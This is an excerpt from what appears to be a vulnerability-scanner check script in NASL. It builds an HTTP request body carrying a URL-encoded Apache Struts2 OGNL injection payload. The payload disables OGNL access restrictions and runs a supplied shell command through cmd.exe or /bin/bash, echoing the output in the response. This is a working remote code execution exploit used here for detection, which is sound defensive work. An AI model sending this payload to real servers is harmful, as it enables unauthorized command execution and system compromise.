...
if(description){
	...
	script_tag( name: "last_modification", value: "2021-09-16 12:27:58 +0000 (Thu, 16 Sep 2021)" );
...
for cmd in keys( cmds ) {
	c = cmds[cmd];
	data = "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D" + "@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%" + "3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23cont" + "ext%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%" + "29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphon" + "y.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPa" + "ckageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClass" + "es%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%2" + "9%29%29%29.%28%23cmd%3D%27" + c + "%27%29.%28%23iswin%3D%28@jav" + "a.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29." + "contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27" + "cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C" + "%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBui" + "lder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%" + "28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.s" + "truts2.ServletActionContext@getResponse%28%29.getOutputStream%2" + "8%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process." + "getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D" + "&age=123&__cheackbox_bustedBefore=true&description=123";
